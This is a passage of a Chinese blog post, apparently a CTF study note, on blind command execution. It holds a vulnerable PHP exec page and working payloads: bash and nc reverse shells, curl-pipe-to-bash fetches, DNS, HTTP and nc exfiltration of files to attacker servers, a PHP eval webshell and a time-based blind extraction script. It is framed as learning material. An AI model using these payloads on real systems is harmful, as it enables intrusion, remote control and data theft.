class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" itemprop="url">web知识总结</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>基本知识</span></a></span></div></div><h1 class="post-title" itemprop="name headline">无回显命令执行</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2023-10-28T00:58:39.136Z" title="发表于 2023-10-28 08:58:39">2023-10-28</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2023-12-22T13:15:33.919Z" title="更新于 2023-12-22 21:15:33">2023-12-22</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">5.5k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>20分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="无回显命令执行"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2023/10/28/wu-hui-xian-ming-ling-zhi-xing/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2023/10/28/wu-hui-xian-ming-ling-zhi-xing/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2023/10/28/wu-hui-xian-ming-ling-zhi-xing/"><header><a class="post-meta-categories" href="/categories/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" itemprop="url">web知识总结</a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" tabindex="-1" itemprop="url">基本知识</a><h1 id="CrawlerTitle" itemprop="name headline">无回显命令执行</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2023-10-28T00:58:39.136Z" title="发表于 2023-10-28 08:58:39">2023-10-28</time><time itemprop="dateCreated datePublished" datetime="2023-12-22T13:15:33.919Z" title="更新于 2023-12-22 21:15:33">2023-12-22</time></header><h1 id="0x01-前言">0x01 前言</h1>
<p>没错，本篇也是在CTF下遇到无回显命令执行之后来进行的学习，不过网上找了很多文章感觉没一个满意的，只能东拼西凑了。</p>
<p>接下来就开始学习之旅：</p>
<p>在渗透测试、漏洞挖掘或安全研究的过程中，我们会遇到很多无回显的命令执行点。面对这些无回显的命令执行点，我们很难获取命令执行结果，甚至无法判断命令是否执行成功。本篇文章主要讨论面对这些无回显的命令执行点时的判断和利用方法。</p>
<h1 id="0x02-无回显判断">0x02 无回显判断</h1>
<p>首先我们需要知道该点是否存在命令执行漏洞，或者我们的命令是否执行成功了。这里的研判方法有很多种，最常用的是直接通过延时判断，类似我们sql注入里的时间盲注：</p>
<blockquote>
<p>cmd=sleep 5</p>
</blockquote>
<p>类似似的函数还有<code>benchmark(count,expr) 和getlock（str，time）</code>。</p>
<p>值得一提的是，windows下并没有sleep命令，那么如何通过时间延时的方式判断windows环境下的命令执行呢？我们可以通过回环ping来达到强制延时的效果：</p>
<blockquote>
<p>ping -n 3 127.0.0.1</p>
<p>ping -n 4 127.0.0.1</p>
</blockquote>
<p>Linux下同样试用，我们还可以通过ping命令在不同环境下的执行方式来判断目标的操作系统类型：</p>
<blockquote>
<p>ping -c 3 127.0.0.1</p>
<p>ping -c 4 127.0.0.1</p>
</blockquote>
<p>这里借用参考文章的图片了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231028090654935.png" alt="image-20231028090654935"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231028090701172.png" alt="image-20231028090701172"></p>
<p>延时判断法是在无回显情况下最简单的判断方式，优点是能分辨操作系统、无论目标是否出网都能判断，缺点是只能判断不能利用。</p>
<h1 id="0x03-ctf场景">0x03 CTF场景</h1>
<p>在ctf中，有时会遇到无回显rce，就是说虽然可以进行命令执行，但却看不到命令执行的结果，也不知道命令是否被执行。</p>
<p>测试代码如下：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'a'</span>];
<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">"<span class="hljs-subst">$a</span>"</span>);
<span class="hljs-comment">//$b=exec("$a");</span>
<span class="hljs-comment">//echo $b;</span>
<span class="hljs-meta">?&gt;</span></code></pre>
<p>命令执行函数我用的是<code>exec</code>,因为这个函数本身是没有回显的，拿来做测试简直不能再合适。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231028092026090.png" alt="image-20231028092026090"></p>
<p>如上图我们执行之后发现页面并没有回显数据，我们首先用sleep命令看看命令是否被成功执行了，看下图它转了五秒之后才恢复说明命令是执行了的：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231028095258283.png" alt="image-20231028095258283"></p>
<h1 id="0x04-绕过方法">0x04 绕过方法</h1>
<h2 id="41-反弹shell">4.1 反弹shell</h2>
<p>遇到这种无回显的命令执行，很常见的一个思路是反弹shell，因为它虽然不会将命令执行的结果输出在屏幕上，但实际上这个命令它是执行了的，那我们就将shell反弹到自己服务器上，然后再执行命令肯定就可以看到回显了</p>
<p>一般来讲我们反弹shell都用的<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>这条命令。–这里呢我复现一直不成功，估计就是环境配置问题，因此这里还是学个思路吧，不想搭环境费时间了。。。</p>
<p>payload：</p>
<pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/192.168.17.137/5555 0&gt;&amp;1

/bin/bash -c <span class="hljs-string">'bash -i &gt;&amp; /dev/tcp/192.168.17.137/5555 0&gt;&amp;1'</span>  //使用指定的bash shell反弹

nc -e /bin/sh ip port</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231028102504431.png" alt="image-20231028102504431"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231028102508994.png" alt="image-20231028102508994"></p>
<p>可以看到他这里已经反弹成功–但我不知道为何复现不成功┭┮﹏┭┮</p>
<p>tip：也可以将命令写入文件，之后在存在命令执行的地方输入<code>curl ip|bash</code>即可反弹</p>
<p>攻击者也可以启动http服务，并在站点目录下存放一个文件，里面写着bash反弹shell命令</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231028225604218.png" alt="image-20231028225604218"></p>
<pre><code class="hljs http">?a=curl%20http://192.168.10.128/bashshell|bash</code></pre>
<p>成功反弹到shell</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231028225621143.png" alt="image-20231028225621143"></p>
<h2 id="42-dns外带">4.2 DNS外带</h2>
<p>发起一个dns请求需要通过linux中的<code>ping</code>命令或者<code>curl</code>命令</p>
<p>然后这里推荐一个dnslog的利用平台：ceye <a target="_blank" rel="noopener" href="http://ceye.io/%EF%BC%8C%E6%B3%A8%E5%86%8C%E8%B4%A6%E5%8F%B7%E4%B9%8B%E5%90%8E%EF%BC%8C%E4%BC%9A%E7%BB%99%E4%B8%80%E4%B8%AA%E5%9F%9F%E5%90%8D%EF%BC%8C%E5%BD%93%E5%8F%91%E8%B5%B7%E7%9A%84%E8%AF%B7%E6%B1%82%E4%B8%AD%E5%90%AB%E6%9C%89%E8%BF%99%E4%B8%AA%E5%9F%9F%E5%90%8D%E6%97%B6%EF%BC%8C%E5%B9%B3%E5%8F%B0%E5%B0%B1%E4%BC%9A%E6%9C%89%E8%AE%B0%E5%BD%95%E3%80%82%E8%BF%99%E9%87%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8dnslog%E5%B9%B3%E5%8F%B0">http://ceye.io/，注册账号之后，会给一个域名，当发起的请求中含有这个域名时，平台就会有记录。这里也可以利用dnslog平台</a></p>
<p>payload如下：</p>
<pre><code class="hljs plaintext">cmd=curl `命令`.域

curl `ls`.78c59j.ceye.io</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231028103757547.png" alt="image-20231028103757547"></p>
<p>如上图可以看到我们成功令数据回显至ceye平台上去</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231028104018956.png" alt="image-20231028104018956"></p>
<p>那么为了让它显示出剩余的结果，我们就需要用到linux的<code>sed</code>命令，用<code>sed</code>命令就可以实现对行的完美划分。</p>
<blockquote>
<p>curl ls | sed -n ‘1p’.78c59j.ceye.io</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231028104228099.png" alt="image-20231028104228099"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231028104345123.png" alt="image-20231028104345123"></p>
<p>结合上面两个图片可以看到我们可以遍历回显出所有目录下的文件</p>
<p>但是值得注意的是，因为有的字符可能会无法显示或者只显示部分信息，所以说执行命令的时候推荐使用base64编码，然后再解开就好：</p>
<pre><code class="hljs plaintext">1;curl `cat 1.txt | base64`.78c59j.ceye.io 

1;curl `ls | base64`.78c59j.ceye.io/</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231028110125718.png" alt="image-20231028110125718"></p>
<p>不过缺点很明显，似乎找不到一个方法可以让回显内容完全，并且我的cat 1.txt这条命令不知为何执行不了。</p>
<p><strong>注意：</strong></p>
<pre><code class="hljs plaintext">1）命令执行时要避免空格，空格会导致空格后面的命令执行不到；
2）将读取的文件命令用反引号``包含起来；
3）拼接的域名有长度限制。</code></pre>
<p><strong>举个例子：</strong></p>
<pre><code class="hljs bash"><span class="hljs-comment">#用&lt;替换读取文件中的空格，且对输出结果base64编码，然后拼接域名</span>
curl `<span class="hljs-built_in">cat</span>&lt;flag.php|<span class="hljs-built_in">base64</span>`.cf1gbs.dnslog.cn
<span class="hljs-comment">#另一种方法</span>
curl `<span class="hljs-built_in">cat</span> flag.php|sed s/[[:space:]]//`.cf1gbs.dnslog.cn</code></pre>
<h2 id="43-http请求">4.3 http请求</h2>
<p>靶机通过向VPS发起<code>HTTP</code>请求，VPS监听到请求则代表命令执行成功(注意：<code>ping</code>命令不产生http请求)</p>
<p>VPS：<code>nc -lvp 8888</code></p>
<p>靶机：<code>cmd=curl ip:8888</code></p>
<p>这里复现一直不成功，找了几篇文章发现：</p>
<pre><code class="hljs plaintext">目标服务器向个人的公网服务器发起http请求，当该公网服务器收到http请求就代表命令有执行。

举个例子捏：
个人的公网服务器使用 nc -lvp 7777 开始监听；
目标服务器使用 curl 公网机ip：端口号。
可以看到公网服务器的该端口有http请求。（注：ping命令不产生http请求）</code></pre>
<p>估计这里不成功的原因在于我使用的kali且kali没出网依旧处于内网。正常的话应该是下图：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231028165820455.png" alt="image-20231028165820455"></p>
<h2 id="44-执行命令需要站点目录具有写权限">4.4 执行命令（需要站点目录具有写权限）</h2>
<pre><code class="hljs plaintext">利用cp命令：cp flag.php 1.txt

利用mv命令：mv flag.php 1.txt

利用&gt;输出结果到文件：ls &gt; 1.txt

利用wget下载：wget http://ip/shell.txt &gt; shell.php或者wget http://ip/shell.txt -O shell.php

利用tar
    tar cvf flag.tar flag.php  # 打包flag.php为flag.tar
    tar zcvf flag.tar.gz flag.php  # 压缩flag.php为flag.tar.gz
    # 解压缩：tar zxvf flag.tar.gz

利用zip
    zip flag.zip flag.php
    #解压缩：unzip flag.zip</code></pre>
<p>这里看一个网上例子（复现不好找。。。</p>
<p>eg：通过命令执行直接得到文件内容</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231028112406995.png" alt="image-20231028112406995"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231028112413548.png" alt="image-20231028112413548"></p>
<p>将<code>cp where_is_flag.php 1.txt</code>做为参数传递给ping，然后就执行了<code>cp where_is_flag.php 1.txt</code>这个命令，生成1.txt文件，在去访问1.txt，就能得到1.txt的内容（也就是where_is_flag.php的内容），最后找到flag</p>
<h2 id="45-直接写入或外部下载webshell">4.5 直接写入或外部下载webshell</h2>
<p>直接写入（需要站点目录具有写权限）</p>
<pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;?php @eval(\$_POST[123]); ?&gt;"</span> &gt; webshell.php</code></pre>
<p>外部下载（目标服务器可以连接外网或可以与攻击机互通，且能执行wget命令）</p>
<pre><code class="hljs bash">wget 攻击机ip -O webshell.php 
<span class="hljs-comment">#使用wget下载shell，使用参数-O来指定一个文件名</span></code></pre>
<h2 id="46-nc外带">4.6 nc外带</h2>
<pre><code class="hljs plaintext">靶机：nc ip 8888 &lt; flag.php
VPS：nc -lvp 8888

当tcp不能使用，-u参数调整为udp

靶机：nc -u ip 8888 &lt; flag.php
VPS：nc -ulvp 8888</code></pre>
<h2 id="47-http外带">4.7 http外带</h2>
<p>看到一篇文章推荐的http信道</p>
<pre><code class="hljs plaintext">?cmd=curl http://给定的URL /?1=`ls /` 注意如果要编码的话,要加个 .
?cmd=curl http://给定的URL /?1=`ls .|base64`</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231028164555559.png" alt="image-20231028164555559"></p>
<p>上图红色标注的地方就是base64加密的结果，我们解密看到下图，可以看到回显的数据很多，似乎这是个优点</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231028164658855.png" alt="image-20231028164658855"></p>
<h2 id="48-在vps上建立记录脚本">4.8 在vps上建立记录脚本</h2>
<p>当目标服务器可以向公网服务器发起http请求，并且能执行curl命令或wget命令</p>
<p>1）在个人公网服务器的根目录构造一个记录脚本：7.php 。</p>
<pre><code class="hljs bash"><span class="hljs-comment">#7.php</span>
&lt;?php
header(<span class="hljs-string">"Content-type:text/html; charest=utf-8"</span>);
highlight_file(_FILE_);
include(<span class="hljs-string">"flag.php"</span>);

<span class="hljs-variable">$ip</span>=<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'ip'</span>];
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span>)
{
        shell_exec(<span class="hljs-string">"ping -c 4"</span>.<span class="hljs-variable">$ip</span>);
}
?&gt;</code></pre>
<p>2）在目标服务器的测试点发送任意一条请求进行测试，将获得的flag进行base64解码即可。</p>
<pre><code class="hljs bash">curl http://*.*.*.**/7.php?data=`<span class="hljs-built_in">cat</span> flag.php|<span class="hljs-built_in">base64</span>`
wget http://*.*.*.*/7.php?data=`<span class="hljs-built_in">cat</span> flag.php|<span class="hljs-built_in">base64</span>`</code></pre>
<p>不过这里没看懂，也没复现成功。。。。</p>
<h2 id="49-burpcollaborator-client">4.9 burp(Collaborator Client)</h2>
<p>使用 curl -F 将flag文件上传到Burp的Collaborator Client。这是一个类似httpslog+dnslog的插件，其功能比dnslog强大，可以不用搭建任何环境去监听dns和http请求，也可以很方便的查看post请求包和cookie等。</p>
<p>获取Collaborator Client分配给BURP的链接：</p>
<p>打开Burp主界面 --&gt;菜单（Burp）–&gt;Burp Collaboraor Client – &gt; 点击 Copy to Clipboard   --此处似乎是低版本的步骤</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231028171627010.png" alt="image-20231028171627010"></p>
<p>如上图，我这里是2023版本的，直接就集成了。</p>
<p>靶机：拼接payload并在命令执行处提交即可查看Collaborator Client收到的数据。</p>
<pre><code class="hljs plaintext">cmd=curl -X POST -F xx=@flag.php http://jj6xpgxristzkbn1fpkl32t6jxpndc.burpcollaborator.net

cmd=1;curl `whoami`.nlcfzmusx6w63w922oozpq59c0ir6iu7.oastify.com</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231028225308308.png" alt="image-20231028225308308"></p>
<h1 id="0x05-py脚本进阶">0x05 py脚本（进阶）</h1>
<p>上述0x04讲得都是利用现有工具进行绕过，但是进阶的CTF题目似乎都要求你有编写py脚本的能力去进行盲注。这里也是有幸找到了一篇文章对此的分析，虽然脚本不会写，但我先立志看懂他。</p>
<p><strong>假设服务器不出网并且web目录不可写</strong></p>
<p>Linux可以用类似盲注的方式得到回显，这次主要写下Windows的，其实也差不多</p>
<p>这里的情况就与我做的CTF题目一样。</p>
<h2 id="51-linux">5.1 Linux</h2>
<p>方法和延时注入差不多，截取命令回显结果循环进行对比，对比到了就用sleep延时</p>
<p>首先要了解linux if语句</p>
<pre><code class="hljs shell">if [ command ];then
	符合条件执行的语句
elif [ command ];then
	符合条件执行的语句
else
	上面都不符合执行的语句
fi</code></pre>
<p>这次只需要用到一个判断所以不用这么复杂</p>
<pre><code class="hljs shell">if [ 1 = 1 ];then sleep 2;fi		#这里的1=1条件成立就会执行下面的sleep 2语句
if [ `whoami|cut -c 1` = 'r' ];then sleep 2;fi		#取出whoami第一个字符对比是否为r，是r则sleep2秒</code></pre>
<p>Linux下反引号是命令替换，一般来说是将执行获得的结果再执行一次，这里可以理解为将命令的结果保存下来后与等号后面的字符对比</p>
<p>cut 命令是切割字符串，<code>whoami|cut -c 1</code>就是得到命令结果的第一个字符，以此类推</p>
<p>在一些回显中可能会出现很多符号，还有中文什么的，为了避免回显结果不准确的情况可以通过base32编码后再执行cut操作</p>
<pre><code class="hljs shell">if [ `whoami|base32|cut -c 1` = 'r' ];then sleep 2;fi</code></pre>
<p>这里使用base32的原因是base32只有大写字母和2-7和=，减少了爆破字符数量，提高了回显结果的精准度</p>
<p>下面用python写个脚本</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> string
<span class="hljs-comment">#str_zf 包含大写字母和数字字符以及等号字符。这些字符将用于构建注入负载。</span>
str_zf = string.ascii_uppercase + <span class="hljs-string">"234567="</span>

<span class="hljs-comment">#cmd 变量包含要执行的命令，而 url 变量包含目标URL，其中将包含注入的命令。</span>
cmd = <span class="hljs-string">"pwd"</span>
url = <span class="hljs-string">"http://10.130.4.204:8081/index.php?cmd="</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_result</span>(<span class="hljs-params">cmd ,url</span>):
    result = <span class="hljs-string">""</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">65535</span>):
        <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> str_zf:
<span class="hljs-comment">#payload 是一个包含命令注入的字符串，例如，如果 i 是1，s 是 'A'，那么 payload 将是一个字符串，用于检查命令输出的第一个字符是否等于 'A'。</span>
            payload = <span class="hljs-string">"if [ `{}|base32|cut -c {}` = '{}' ];then sleep 5;fi"</span>.<span class="hljs-built_in">format</span>(cmd, i, s)
            url_payload = url + payload
            response = requests.get(url_payload)
            <span class="hljs-comment">#发送HTTP GET请求到 url_payload，并记录响应的时间。</span>
            time = response.elapsed.total_seconds()
            <span class="hljs-comment">#如果响应时间大于3秒（假设命令输出的字符与 s 匹配），则将 s 添加到 result 中。</span>
            <span class="hljs-keyword">if</span> time &gt; <span class="hljs-number">3</span>:
                result += s
                <span class="hljs-built_in">print</span>(result)
                <span class="hljs-keyword">break</span>


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    get_result(cmd, url)</code></pre>
<p><code>string.ascii_uppercase</code> 是 Python 标准库中 <code>string</code> 模块中的一个常量，它包含了英文字母的大写版本，即 A 到 Z 的 26 个字符。具体来说，<code>string.ascii_uppercase</code> 包含以下字符：</p>
<pre><code class="hljs plaintext">ABCDEFGHIJKLMNOPQRSTUVWXYZ</code></pre>
<p>这个常量通常用于字符串操作，特别是在需要引用英文大写字母集合的情况下。例如，您可以使用 <code>string.ascii_uppercase</code> 来生成随机的大写字母，检查字符串中是否包含大写字母等等。这个常量提供了一个方便的方式来引用大写字母集合，而不必手动键入所有大写字母。</p>
<p>以上是参考GPT回答而去了解代码含义</p>
<p>下面是实例图片</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231028181938075.png" alt="image-20231028181938075"></p>
<h2 id="52-windows">5.2 Windows</h2>
<p>在Linux中可以通过ping带出命令，但是Windows不会把命令结果拼接到dnslog上，可以用for循环得到结果再进行拼接</p>
<pre><code class="hljs sh"><span class="hljs-keyword">for</span> /F %i <span class="hljs-keyword">in</span> (<span class="hljs-string">'echo a'</span>) <span class="hljs-keyword">do</span> ping -n 1 %i.qzdxj3.dnslog.cn</code></pre>
<p>这里就是多提一句，重点还是在不出网的情况下</p>
<p>Windows中的问题就是命令结果保存在哪里，并不可以像Linux一样直接截取</p>
<p>这次假设是web目录不可写，那就需要思考下写到别的目录该怎么读到</p>
<ol>
<li>将命令回显的结果写到一个可写的目录下</li>
<li>使用certutil将命令结果base64编码，原因同上可以避免特殊字符，提高结果的准确度</li>
<li>用findstr /V参数去除多余的字符，将去除掉多余字符的base64编码再次写入一个文件</li>
</ol>
<pre><code class="hljs plaintext">certutil -encode d:\\a d:\\b			#编码命令

文件格式:
-----BEGIN CERTIFICATE-----
base64
-----END CERTIFICATE-----</code></pre>
<p>去除的是首行尾行的多余字符，\V参数是匹配到相同的字符然后去除</p>
<ol>
<li>用for循环去除换行符</li>
<li>写入bat对比字符串</li>
</ol>
<pre><code class="hljs php">@<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">off</span>
(<span class="hljs-keyword">for</span> /f <span class="hljs-string">"delims="</span> %%i <span class="hljs-title function_ invoke__">in</span> (<span class="hljs-string">'type "d:\c"'</span>) <span class="hljs-keyword">do</span> (set /p =%%i&lt;nul))&gt;<span class="hljs-string">"d:\d"</span></code></pre>
<p>以下是GPT对上述代码的解释：</p>
<pre><code class="hljs plaintext">这是一个 Windows 批处理脚本，主要用于将文件 "d:\c" 的内容逐行写入文件 "d:\d"，并保留文件 "d:\d" 中的空行。以下是对脚本的逐行分析：

@echo off：这是批处理脚本的一般开头。它会关闭批处理的命令回显，这意味着在运行脚本时，不会显示每个命令的文本。这使得输出更清晰，因为不会显示命令本身，只会显示命令的结果。

(for /f "delims=" %%i in ('type "d:\c"') do (set /p =%%i&lt;nul))：这是脚本的核心部分，它执行以下操作：

for /f "delims=" %%i in ('type "d:\c"')：这部分使用 for 命令来循环处理文件 "d:\c" 中的内容，"delims=" 部分指示不使用分隔符，因此整行文本将被读取。

